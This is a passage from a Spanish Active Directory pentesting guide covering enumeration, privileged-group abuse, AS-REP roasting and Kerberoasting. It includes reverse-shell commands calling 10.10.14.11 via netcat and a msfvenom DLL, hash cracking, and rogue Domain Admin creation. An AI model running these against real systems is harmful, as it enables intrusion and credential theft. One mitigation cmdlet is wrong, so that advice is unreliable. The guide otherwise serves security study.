##### Opción 2

La segunda manera, consta de los siguientes pasos:

1. Descargar [SharpHound.ps1](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)

```bash
wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
```

2. Subirlo a la máquina víctima ya sea con un servidor de SMB o upload de evil-winrm.
3. Importar el módulo:
```powershell
powershell -ep bypass
Import-Module .\SharpHound.ps1
```
4. Invocar a `BloodHound`

```powershell
Invoke-BloodHound -CollectionMethod All
```
Ahora queda descargar el zip y meterlo en BloodHound.

##### Opción 3

Otra alternativa es utilizar [SharpHound.exe](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe).

```powershell
.\SharpHound.exe -c all
```

Por ultimo, descargamos el archivo `zip` nuevamente y los subimos en `BloodHound`.

####  11.4.4. <a name='ldapsearch'></a>ldapsearch
Para enumerar a través del protoclo LDAP, podemos usar la herramienta `ldapsearch`:

```bash
ldapsearch -H ldap://192.168.56.10 -x -s base namingcontexts
```

- `-H ldap://192.168.56.10`: Especifica el URI del servidor LDAP al que se va a conectar. En este caso, ldap://192.168.56.10.

- `-x`: Indica que se utilizará el método de autenticación simple. Esto es comúnmente utilizado para realizar pruebas, pero no es seguro para ambientes de producción.

- `-s base`: Especifica el alcance de la búsqueda. En este caso, base significa que la búsqueda se realiza en el objeto base especificado.

- `namingContexts`: Especifica el atributo que se desea buscar. En este caso, namingContexts es el atributo que contiene los contextos de nombres del servidor LDAP.

```bash
ldapsearch -x -H ldap://192.168.56.10 -D '' -w '' -b "DC=192.168.56.10,DC=local"
ldapsearch -x -h 192.168.56.10 -b "dc=hacklab,dc=local" "*" | awk '/dn: / {print $2}'
ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -b "DC=HACKLAB,DC=LOCAL"
ldapsearch -H ldap://192.168.56.10 -D 'thomas.brown@HACKLAB.local' -w 'MySup3erPass123!' -x -s base -b "DC=HACKLAB,DC=LOCAL" "(objectClass=*)" "*" +
```

####  11.4.5. <a name='ldapdomaindump'></a>ldapdomaindump

En caso de tener credenciales válidas podemos hacer uso de `ldapdomaindump`:

```bash
ldapdomaindump -u 'HACKLAB.local\thomas.brown' -p 'Password123' 192.168.56.10
```

Esto generará unos archivos `json`, `grep`, `html` que con un servidor web podemos ver en el navegador.

####  11.4.6. <a name='netexec---ldap'></a>NetExec - LDAP

```bash
netexec ldap <RHOST> -u '' -p '' -M -user-desc
netexec ldap <RHOST> -u '' -p '' -M get-desc-users
netexec ldap <RHOST> -u '' -p '' -M ldap-checker
netexec ldap <RHOST> -u '' -p '' -M veeam
netexec ldap <RHOST> -u '' -p '' -M maq
netexec ldap <RHOST> -u '' -p '' -M adcs
netexec ldap <RHOST> -u '' -p '' -M zerologon
netexec ldap <RHOST> -u '' -p '' -M petitpotam
netexec ldap <RHOST> -u '' -p '' -M nopac
netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
```

###  11.5. <a name='grupos-privilegiados'></a>Grupos Privilegiados

####  11.5.1. <a name='account-operators'></a>Account Operators

Es un grupo incorporado de Active Directory pensado para delegar la gestión de cuentas de usuarios y grupos estándar, sin dar acceso completo de administración del dominio.

##### Enumeración

```powershell
net group "Account Operators" /domain
```

O desde PowerView:

```powershell
Get-NetGroupMember -GroupName "Account Operators"
```

##### 🔑 Privilegios del grupo

Por defecto, los miembros de Account Operators pueden:

- ✅ Crear, modificar y eliminar cuentas de usuarios en los siguientes contenedores:

    - `CN=Users`
    - `CN=Computers`

- ✅ Agregar usuarios a grupos locales (¡no de dominio!)
- ✅ Leer y escribir muchos atributos de cuentas de usuario (como userAccountControl, description, etc.)
- ✅ Resetear contraseñas de cuentas que no sean administradores.

❌ No pueden tocar:

- Miembros de grupos protegidos (ej: Domain Admins, Administrators, Enterprise Admins, etc.)
- Atributos “sensibles” como adminCount = 1 (si está bien protegido)
- Cuentas fuera del scope delegado (como en OUs personalizadas)

##### Explotación

###### Ejemplo 1 – Crear un usuario + agregarlo a RBCD

1. Crear un usuario

    ```powershell
    New-ADUser -Name "hacker" -SamAccountName hacker -AccountPassword (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force) -Enabled $true
    ```

2. Crear un equipo falso (computer account)

    (Esto requiere que MachineAccountQuota esté > 0, o que tengamos permisos)

    ```powershell
    addcomputer.py -method SAMR -computer-name FAKEPC -computer-pass P@ss1234 -dc-ip 10.10.10.1 CORP.local/eviluser:P@ssw0rd123
    ```

3. Configurar RBCD en un equipo objetivo (si tenemos WriteDACL sobre él)

    O con PowerView (desde Windows):

    ```powershell
    Set-ADComputer TargetHost -PrincipalsAllowedToDelegateToAccount FAKEPC$
    ```

4. Hacer impersonación y obtener acceso al target

###### Ejemplo 2 - Cambiar la contraseña de otra cuenta

Si encontramos un usuario sin `adminCount` y dentro del scope de Account Operators:

```powershell
Set-ADAccountPassword -Identity tyrell.wellick -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

###### Ejemplo 3 – Agregar usuario a un grupo importante

> Si tenemos WriteProperty o GenericAll sobre un grupo importante como "Server Operators" o "Backup Operators", podemos agregarnos.

```powershell
Add-ADGroupMember -Identity 'Server Operators' -Members hacker
```

Desde aquí, podemos abusar del grupo (como Backup Operators para leer SAM/NTDS.dit).

###### Ejemplo 4 - Asignar SPN a un usuario - Kerberoasting

```powershell
Import-module .\PowerView.ps1
Set-DomainObject -Identity tyrell.wellick -SET @{serviceprincipalname='nonexistent/FAKE'}
```

####  11.5.2. <a name='server-operators'></a>Server Operators

Es un grupo buit-in en los controladores de dominio (DC) que tiene privilegios para administrar servidores, pero no es un grupo administrativo a nivel dominio como Domain Admins.

👉 Sin embargo, si el DC es el único "servidor" en el entorno, este grupo puede ser la puerta directa para escalar a DA.

##### 🔑 Privilegios que tiene por defecto

Un miembro de Server Operators puede hacer lo siguiente en un Domain Controller:

- ✅ Reiniciar o apagar el sistema
- ✅ Cargar y descargar driver 
- ✅ Realizar backups y restores
- ✅ Iniciar/Detener servicios
- ✅ Conectarse vía RDP
- ✅ Escribir en C:\Windows\Tasks

##### Explotación

###### Abuso de privilegios de servicios

```powershell
sc.exe config someService binPath= "C:\temp\nc.exe -e cmd 10.10.14.11 4444"
sc.exe stop someService
sc.exe start someService
```

###### Agregarte a Administradores Locales del DC

Ya que podemos escribir sobre el servicio o hacer RDP, podemos ejecutarte como `NT AUTHORITY\SYSTEM` y:

```powershell
net localgroup administrators hacker /add
```

###### Meter payloads en tareas programadas (Scheduled Tasks)

Podemos escribir en `C:\Windows\Tasks`, lo que se puede usar para ejecución diferida o persistencia.

####  11.5.3. <a name='dnsadmins'></a>DnsAdmins

Los usuarios que son miembros del grupo **DnsAdmins** tienen la capacidad de abusar de una característica del protocolo de gestión DNS de Microsoft para hacer que el servidor DNS cargue cualquier DLL especificada. El servicio que a su vez, ejecuta la DLL se realiza en el contexto de SYSTEM y podría utilizarse en un controlador de dominio (desde donde se ejecuta DNS normalmente) para obtener privilegios de administrador de dominio.

En el siguiente ejemplo, el usuario `ryan` pertenece al grupo `DnsAdmins`.

##### Enumeración

PowerShell

```powershell
Get-ADGroupMember -Identity "DnsAdmins"
```

Powerview

```powershell
Get-NetGroupMember -Identity "DNSAdmins"
```

net

```powershell
net user ryan /domain
```

Bloodhound

![DnsAdmins](./img/dnsadmins.png)

##### Explotación

1. Creación de la DLL maliciosa

    `msfvenom` puede ser utilizado para crear una DLL maliciosa que, cuando es ejecutada por DNS se conectará de nuevo a la máquina del atacante en el contexto de SYSTEM en el Domain Controller.

    ```bash
    msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f dll > exploit.dll
    ```

2. Creamos un recurso compartido con `impacket-smbserver`

    ```bash
    impacket-smbserver -smb2support kali .
    ```

3. Registrar la DLL.

    Una vez que la DLL maliciosa se ha cargado en el objetivo, se puede utilizar el siguiente comando para registrar la DLL.

    ```powershell
    dnscmd.exe RESOLUTE /config /serverlevelplugindll \\10.10.14.11\kali\exploit.dll
    ```

    1. `dnscmd.exe`: Es una herramienta de línea de comandos utilizada para administrar y configurar servidores DNS en entornos de Windows.
    2. `resolute`: Es el nombre del servidor DNS al que se enviará el comando. En este caso, "resolute" es el nombre de ejemplo del servidor al que se desea enviar la configuración.
    3. `/config`: Indica que se está realizando una operación de configuración en el servidor DNS.
    4. `/serverlevelplugindll`: Este parámetro especifica que se está configurando un complemento DLL a nivel de servidor en el servidor DNS. Los complementos DLL pueden proporcionar funcionalidades adicionales al servidor DNS.
    5. `C:\Users\Ryan\Documents\exploit.dll`: Esta es la ruta de la DLL que se está intentando cargar como complemento en el servidor DNS. En este caso, se está especificando la ruta completa del archivo DLL llamado `exploit.dll` ubicado en la carpeta "C:\Users\Moe\Documents".

    6. Escucha con `netcat` (Atacante)
    En nuestro host de ataque, nos ponemos en escucha con netcat en el puerto especificado anteriormente en el comando msfvenom.

    ```bash
    rlwrap nc -lnvp 4444
    ```

4. Detener e iniciar el servicio DNS

    A partir de aquí, detener el servicio DNS e iniciarlo de nuevo generará un intérprete de comandos SYSTEM para el oyente netcat.

    ```powershell
    sc.exe stop dns
    sc.exe start dns
    ```

5. Persistencia

    Desde aquí se puede conseguir la persistencia de Administrador de Dominio. Se puede crear un nuevo usuario con privilegios de Administrador de Dominio.

    ```bash
    net user hacker Password123! /add && net group "Domain Admins" /add hacker
    ```

####  11.5.4. <a name='backup-operators'></a>Backup Operators

Ver [BackupOperators - SeBackupPrivilege y SeRestorePrivilege](#backupoperators---sebackupprivilege-y-serestoreprivilege).

###  11.6. <a name='kerberos'></a>Kerberos

![Kerberos](./img/kerberos.webp)

####  11.6.1. <a name='¿qué-es-kerberos?'></a>¿Qué es Kerberos?

Kerberos es un protocolo de **autenticación**, pero no de autorización. Esto significa que su función es verificar la identidad de un usuario mediante una contraseña conocida solo por él, sin definir a qué recursos o servicios puede acceder.  

En entornos **Active Directory**, Kerberos juega un papel clave al proporcionar información sobre los privilegios de los usuarios autenticados. Sin embargo, la responsabilidad de verificar si estos privilegios son suficientes para acceder a determinados recursos recae en los propios servicios.

El protocolo Kerberos opera a través de los puertos `UDP/88` y `TCP/88`, los cuales deben estar a la escucha en el `Key Distribution Center (KDC)` para garantizar el correcto funcionamiento del sistema de autenticación.

Kerberos involucra varios componentes encargados de gestionar la autenticación de los usuarios. Los principales son:

- **Cliente o usuario**: La entidad que desea acceder a un servicio.

- **Application Server (AP)**: El servidor donde se encuentra el servicio al que el usuario quiere acceder.

- **Key Distribution Center (KDC)**: Servicio central de Kerberos responsable de distribuir tickets a los clientes. Se ejecuta en el Controlador de Dominio (DC) e incluye:

- **Authentication Service (AS)**: Emite los Ticket Granting Tickets (TGTs), que permiten solicitar acceso a servicios sin necesidad de volver a introducir credenciales.

Para garantizar la seguridad, Kerberos cifra y firma varias estructuras, como los tickets, evitando que sean manipuladas por terceros. En Active Directory, se manejan las siguientes claves de cifrado:

- **Clave del KDC (krbtgt)**: Derivada del hash NTLM de la cuenta krbtgt.

- **Clave de usuario**: Derivada del hash NTLM del propio usuario.

- **Clave de servicio**: Basada en el hash NTLM del propietario del servicio, que puede ser una cuenta de usuario o del servidor.

- **Clave de sesión**: Generada dinámicamente entre el cliente y el KDC para asegurar la comunicación.

- **Clave de sesión de servicio**: Establecida entre el cliente y el AP para proteger la comunicación con el servicio.

##### Tickets

Kerberos utiliza **tickets**, estructuras que permiten a los usuarios autenticados realizar acciones dentro del dominio de Kerberos sin necesidad de volver a introducir credenciales. Existen dos tipos principales:

- **Ticket Granting Ticket (TGT)**: Se presenta ante el KDC para solicitar otros tickets de servicio (TGS). Está cifrado con la clave del KDC.

- **Ticket Granting Service (TGS)**: Se presenta ante un servicio para obtener acceso a sus recursos. Está cifrado con la clave del servicio correspondiente.

##### PAC

El **Privilege Attribute Certificate (PAC)** es una estructura incluida en la mayoría de los tickets, que contiene los privilegios del usuario. Está firmada con la clave del KDC, lo que garantiza su integridad.

Si bien los servicios pueden verificar el PAC comunicándose con el KDC, esto no es una práctica común. En cualquier caso, esta verificación solo consiste en comprobar la firma del PAC, sin validar si los privilegios del usuario son correctos.

Además, un cliente puede evitar que el PAC se incluya en su ticket especificándolo en el campo `KERB-PA-PAC-REQUEST` de la solicitud.

##### Mensajes

Kerberos permite la comunicación entre sus agentes mediante distintos tipos de mensajes, entre los más relevantes se encuentran:

- **KRB_AS_REQ**: Enviado por el usuario para solicitar un TGT al KDC.

- **KRB_AS_REP**: Respuesta del KDC, que entrega el TGT al usuario.

- **KRB_TGS_RE**Q: Enviado por el usuario para solicitar un TGS al KDC, utilizando su TGT.

- **KRB_TGS_RE**P: Respuesta del KDC, que envía el TGS solicitado al usuario.

- **KRB_AP_REQ**: (Opcional) Utilizado por un servicio para autenticarse frente al usuario.

- **KRB_ERROR:** Usado por los distintos agentes para notificar errores en la comunicación.

Adicionalmente, aunque no forma parte del protocolo Kerberos sino de NRPC, el Application Server (**AP**) puede utilizar el mensaje `KERB_VERIFY_PAC_REQUEST` para enviar la firma del **PAC** al **KDC** y verificar su validez.

A continuación se muestra un resumen de los mensajes siguiendo la secuencia de autenticación.

![Kerberos Flow](./img/kerberos_flow.png)

####  11.6.2. <a name='as-reproasting'></a>AS-REPRoasting

**AS-REPRoasting** es uno de los ataques más básicos contra Kerberos y tiene como objetivo cuentas sin **preautenticación habilitada**. Aunque es poco común en entornos bien configurados, es uno de los pocos ataques de Kerberos que **no requiere autenticación previa**.  

El único dato que el atacante necesita es el **nombre de usuario** de la víctima, algo que puede obtener mediante técnicas de **enumeración**. Con esta información, el atacante envía una solicitud **AS_REQ** (Authentication Service Request) al **KDC** (Key Distribution Center), haciéndose pasar por el usuario.  

Dado que la preautenticación está deshabilitada, el **KDC** responde con un **AS_REP**, que incluye datos cifrados con una clave derivada de la **contraseña del usuario**. El atacante puede capturar este mensaje y realizar un **ataque de fuerza bruta o cracking offline** para recuperar la contraseña.

##### ¿Cómo funciona?  

Las solicitudes de **Ticket Granting Ticket (TGT)** en Kerberos están cifradas utilizando la **marca de tiempo actual (timestamp)** y una clave derivada de la **contraseña del usuario**. Cuando el **Controlador de Dominio (DC)** recibe esta solicitud, intenta descifrarla para verificar que la contraseña utilizada es correcta. Si la autenticación es exitosa, el **KDC** emite un **TGT** al usuario mediante un mensaje **AS-REP**, junto con una **clave de sesión** cifrada con la contraseña del usuario.  

Si una cuenta tiene la **preautenticación deshabilitada**, un atacante puede solicitar un **TGT** sin necesidad de credenciales previas. En este caso, el **KDC** enviará un **AS-REP** con el **TGT cifrado**, que el atacante puede capturar y luego descifrar offline utilizando herramientas como **Hashcat** o **John the Ripper** para recuperar la contraseña del usuario.  

En resumen, cualquier cuenta con la opción **"No requiere Kerberos Preauthentication"** habilitada es vulnerable a este ataque, permitiendo a un atacante obtener su **TGT** y descifrarlo fuera de línea.

##### Desde Linux

Se puede utilizar el script [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) de Impacket para recolectar mensajes AS_REP sin pre-autenticacin desde una máquina Linux. Los siguientes comandos permiten utilizar una lista de usuarios o dadas una credenciales, realizar una consulta LDAP para obtener usuarios sobre los que realizar el ataque:

> **AS-REPRoasting** es similar a **Kerberoasting**, pero en lugar de atacar las respuestas **TGS-REP**, se dirige a las respuestas **AS-REP**.

```bash
impacket-GetNPUsers -usersfile ad_users.txt hacklab.local/ -dc-ip 192.168.56.10 -format hashcat -outputfile hashes.asreproast
```

##### Desde Windows

Podemos usar Rubeus para llevar a cabo este ataque desde una máquina Windows:

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
```
###### Crackeando el ASP_REP

```bash
hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt
```

```bash
john --wordlist=rockyou.txt hashes.asreproast
```

##### 🛡️ Mitigación del ataque AS-REP Roast

- Habilitar la preautenticación Kerberos:

    - En PowerShell, podemos uitilizar el cmdlet Set-ADUser -KerberosEncryptionType None para verificar y ajustar la configuración.

    - En Active Directory Users and Computers (ADUC), en la sección de propiedades del usuario, seleccionar la pestaña "Cuenta" y asegúrarse de que la opción "No requerir preautenticación Kerberos" no esté marcada.

- Utilizar contraseñas robustas.

- Revisión de políticas de seguridad.

####  11.6.3. <a name='kerberoasting'></a>Kerberoasting  

> Un **Service Principal Name (SPN)** es un identificador único de una instancia de servicio. Los SPN son utilizados por la autenticación Kerberos para asociar una instancia de servicio con una cuenta de inicio de sesión de servicio.  
> — [MSDN](https://docs.microsoft.com/windows/desktop/AD/service-principal-names)  

> A diferencia del **AS-REP Roasting**, que no requiere credenciales previas, en **Kerberoasting** es necesario contar con credenciales válidas en el dominio. Esto puede ser un usuario en texto claro, un hash NTLM, una shell con contexto de usuario de dominio o acceso a nivel **SYSTEM** en un equipo unido al dominio.  

##### ¿Qué es Kerberoasting?  

**Kerberoasting** es un ataque dirigido a **cuentas de servicio** en **Active Directory**, que permite a un atacante descifrar contraseñas fuera de línea. A diferencia de **AS-REP Roasting**, este ataque **requiere autenticación previa** en el dominio, es decir, el atacante necesita acceso con una cuenta de usuario, aunque sea de **bajo privilegio**, o un sistema dentro de la red del dominio.  

Cuando un servicio se registra en Active Directory, se le asigna un **Service Principal Name (SPN)**, que actúa como alias para una cuenta de servicio real. Esta información incluye el **nombre del servidor, el puerto y el hash de la contraseña de la cuenta de servicio**. Idealmente, estas cuentas deberían tener contraseñas seguras con mecanismos de **auto-rotación**, pero en la práctica, **muchos SPN están asociados a cuentas de usuario en lugar de cuentas de servicio**, debido a configuraciones deficientes o falta de soporte por parte de algunos proveedores.  

Si una cuenta de servicio tiene una contraseña débil, un atacante puede explotar esta vulnerabilidad. **Cualquier usuario del dominio puede solicitar un Ticket Granting Service (TGS) para cualquier servicio registrado en el dominio**. Una vez recibido el **TGS**, el atacante puede extraerlo y descifrarlo offline, utilizando herramientas como **Hashcat** o **John the Ripper**, para intentar recuperar la contraseña de la cuenta asociada al servicio.  

##### Implicaciones de seguridad  

Durante una **prueba de penetración**, si se detecta un **SPN vinculado a una cuenta de usuario**, pero su contraseña no se puede descifrar, el hallazgo suele considerarse de **baja gravedad**. Sin embargo, si la contraseña es débil, en el futuro podría ser vulnerable a ataques de fuerza bruta. El propósito de este hallazgo es educar al cliente sobre los riesgos asociados y la importancia de asegurar correctamente estas cuentas.

##### Desde Linux

Con una máquina Linux, se pueden obtener todos los TGS’s utilizando el script [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) de impacket. Con el siguiente comando se puede llevar a cabo el ataque y salvar los TGS’s descubiertos:

```bash
impacket-GetUserSPNs hacklab.local/pparker:Password123 -dc-ip 192.168.56.10 -request -outputfile hashes.kerberoast
```

##### Desde Windows

Del mismo modo, se puede realizar el ataque de Kerberoasting desde Windows con varias herramientas como Rubeus.

```powershell
.\Rubeus.exe kerberoast /creduser:hacklab.local\pparker /credpassword:Password123 /outfile:hashes.kerberoast
```

##### Crackeando los TGS's

Utilizamos `hashcat` para romper el hash y recuperar la contraseña de la cuenta de servicio.

| Modo    | Descripción                                           |
| ------- | ----------------------------------------------------- |
| `13100` | Kerberos 5 TGS-REP etype 23 (RC4)                     |
| `19600` | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
| `19700` | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |
| `18200` | Kerberos 5, etype 23, AS-REP                          |

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

John The Ripper

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
```

##### Asignar SPN a un usuario

En caso de tener un permiso como `GenericAll` o `GenericWrite` lo que podemos hacer es Asignar un SPN falso a la cuenta de usuario para luego obtener el hash devuelte por TGS-REP y crackearlo.

```powershell
Import-module .\PowerView.ps1
Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

##### 🛡️ Mitigación del ataque Kerberoasting

- Utilizar contraseñas robustas.

- Privilegios mínimos: Otorgar a los usuarios únicamente los privilegios necesarios para realizar sus tareas específicas y restringir cualquier privilegio adicional que no sea esencial para evitar posibles riesgos de seguridad. Este enfoque ayuda a reducir la superficie de ataque y a limitar el impacto de posibles violaciones de seguridad.

- No ejecutar las cuentas de Servicio como Administrador del Dominio.

###  11.7. <a name='movimiento-lateral-1'></a>Movimiento Lateral

###  11.8. <a name='post-explotación'></a>Post Explotación

##  12. <a name='apéndice'></a>Apéndice

###  12.1. <a name='🛡️-permisos-delegables-en-active-directory'></a>🛡️ Permisos delegables en Active Directory

| Permiso               | Descripción                                                                    |
| --------------------- | ------------------------------------------------------------------------------ |
| `GenericAll`          | Permisos completos sobre el objeto. Puede hacer cualquier acción.              |
| `GenericWrite`        | Puede modificar ciertos atributos del objeto (no todos).                       |
| `WriteOwner`          | Puede cambiar el propietario del objeto.                                       |
| `WriteDACL`           | Puede modificar la lista de control de accesos (DACL) del objeto.              |
| `AllExtendedRights`   | Puede cambiar o resetear la contraseña, y ejecutar otras acciones extendidas.  |
| `ForceChangePassword` | Puede cambiar la contraseña del objeto sin conocer la actual.                  |
| `Self`                | Puede agregarse a sí mismo en ciertos atributos, como por ejemplo, a un grupo. |

###  12.2. <a name='🎯-flags-de-useraccountcontrol-(ad)'></a>🎯 Flags de userAccountControl (AD)

| Flag Name                        | Valor (Decimal) | Valor (Hexadecimal) | Descripción                                                                  |
|----------------------------------|------------------|----------------------|----------------------------------------------------------------------------|
| SCRIPT                           | 1                | 0x0001               | Script de inicio asociado a la cuenta.                                     |
| ACCOUNTDISABLE                   | 2                | 0x0002               | Cuenta deshabilitada.                                                      |
| HOMEDIR_REQUIRED                 | 8                | 0x0008               | Requiere un home directory.                                                |
| LOCKOUT                          | 16               | 0x0010               | Cuenta bloqueada.                                                          |
| PASSWD_NOTREQD                   | 32               | 0x0020               | No se requiere contraseña. (útil en algunos ataques)                       |
| PASSWD_CANT_CHANGE               | —                | —                    | No es una flag directa, se controla vía ACLs.                              |
| ENCRYPTED_TEXT_PWD_ALLOWED       | 128              | 0x0080               | Permite contraseñas en texto claro. (inseguro)                             |
| TEMP_DUPLICATE_ACCOUNT           | 256              | 0x0100               | Cuenta temporal de replicación.                                            |
| NORMAL_ACCOUNT                   | 512              | 0x0200               | Cuenta de usuario estándar.                                                |
| INTERDOMAIN_TRUST_ACCOUNT        | 2048             | 0x0800               | Cuenta de confianza entre dominios.                                        |
| WORKSTATION_TRUST_ACCOUNT        | 4096             | 0x1000               | Cuenta de equipo (join a dominio).                                         |
| SERVER_TRUST_ACCOUNT             | 8192             | 0x2000               | Controlador de dominio.                                                    |
| DONT_EXPIRE_PASSWORD             | 65536            | 0x10000              | La contraseña no expira nunca.                                             |
| MNS_LOGON_ACCOUNT                | 131072           | 0x20000              | Cuenta para cluster MNS.                                                   |
| SMARTCARD_REQUIRED               | 262144           | 0x40000              | Requiere autenticación con smartcard.                                      |
| TRUSTED_FOR_DELEGATION           | 524288           | 0x80000              | Esta cuenta puede hacer delegación (Unconstrained Delegation).             |
| NOT_DELEGATED                    | 1048576          | 0x100000             | No puede ser usada para delegación.                                        |
| USE_DES_KEY_ONLY                 | 2097152          | 0x200000             | Sólo usa DES (inseguro, deprecated).                                       |
| DONT_REQUIRE_PREAUTH             | 4194304          | 0x400000             | ⚠️ **No requiere preautenticación Kerberos** (usado en AS-REP Roasting).   |
| PASSWORD_EXPIRED                 | 8388608          | 0x800000             | La contraseña expiró.                                                      |
| TRUSTED_TO_AUTH_FOR_DELEGATION  | 16777216         | 0x1000000            | Constrained delegation (S4U2Self).                                          |
| PARTIAL_SECRETS_ACCOUNT          | 67108864         | 0x4000000            | Cuenta protegida con secretos parciales (Windows 10/2016+).                |

> 💡 Podemos combinar múltiples flags con OR binario (`-bor`) y removerlas con AND + NOT (`-band -bnot`).


##  13. <a name='herramientas-y-recursos'></a>Herramientas y Recursos

Enlaces a las distintas herramientas y recursos.
###  13.1. <a name='pivoting-1'></a>Pivoting

| Nombre    | URL                                                                      |
| --------- | ------------------------------------------------------------------------ |
| Chisel    | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
                            
###  13.2. <a name='information-gathering-1'></a>Information Gathering

| Nombre | URL                          |
| ------ | ---------------------------- |
| Nmap   | https://github.com/nmap/nmap |

###  13.3. <a name='web-1'></a>Web

| Nombre                     | URL                                                                          |
| -------------------------- | ---------------------------------------------------------------------------- |
| ffuf                       | https://github.com/ffuf/ffuf                                                 |
| Gobuster                   | https://github.com/OJ/gobuster                                               |
| PayloadAllTheThings        | https://github.com/swisskyrepo/PayloadsAllTheThings                          |
| Wfuzz                      | https://github.com/xmendez/wfuzz                                             |
| WhatWeb                    | https://github.com/urbanadventurer/WhatWeb                                   |
| WPScan                     | https://github.com/wpscanteam/wpscan                                         |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator                      |
| Leaky Paths                | https://github.com/ayoubfathi/leaky-paths                                    |
| Joomscan                   | https://github.com/OWASP/joomscan                                            |
| Droopescan                 | https://github.com/SamJoan/droopescan                                        |
| Magescan                   | https://github.com/steverobbins/magescan                                     |
| Git-Dumper                 | https://github.com/arthaud/git-dumper                                        |
| Extractor                  | https://github.com/internetwache/GitTools/blob/master/Extractor/extractor.sh |

###  13.4. <a name='bases-de-datos'></a>Bases de datos

| Nombre                   | URL                            |
| ------------------------ | ------------------------------ |
| SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |

###  13.5. <a name='passwords-attacks-1'></a>Passwords Attacks

| Nombre                          | URL                                                                                                        |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Default Credentials Cheat Sheet | [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) |
| Firefox Decrypt                 | [https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt)                       |
| hashcat                         | [https://hashcat.net/hashcat](https://hashcat.net/hashcat)                                                 |
| Hydra                           | [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)                   |
| John                            | [https://github.com/openwall/john](https://github.com/openwall/john)                                       |
| keepass-dump-masterkey          | [https://github.com/CMEPW/keepass-dump-masterkey](https://github.com/CMEPW/keepass-dump-masterkey)         |
| KeePwn                          | [https://github.com/Orange-Cyberdefense/KeePwn](https://github.com/Orange-Cyberdefense/KeePwn)             |
| Kerbrute                        | [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)                                   |
| LaZagne                         | [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)                           |
| mimikatz                        | [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)                           |
| NetExec                         | [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)                             |
| ntlm.pw                         | [https://ntlm.pw](https://ntlm.pw)                                                                         |
| pypykatz                        | [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)                                 |

###  13.6. <a name='wordlists'></a>Wordlists

| Nombre                        | URL                                                                                                                |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| SecLists                      | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)                           |
| Kerberos Username Enumeration | [https://github.com/attackdebris/kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists) |
| bopscrk                       | [https://github.com/R3nt0n/bopscrk](https://github.com/R3nt0n/bopscrk)                                             |
| CUPP                          | [https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)                                                     |
| COOK                          | [https://github.com/giteshnxtlvl/cook](https://github.com/giteshnxtlvl/cook)                                       |
| Username Anarchy              | [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)         |
| CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
| API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |

###  13.7. <a name='active-directory-1'></a>Active Directory

| Nombre   | URL                                                      |
| -------- | -------------------------------------------------------- |
| Powermad | https://github.com/Kevin-Robertson/Powermad              |

###  13.8. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios

| Nombre   | URL                                                      |
| -------- | -------------------------------------------------------- |
| Winpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS |
| Seatbelt | https://github.com/GhostPack/Seatbelt                    |
| Linpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
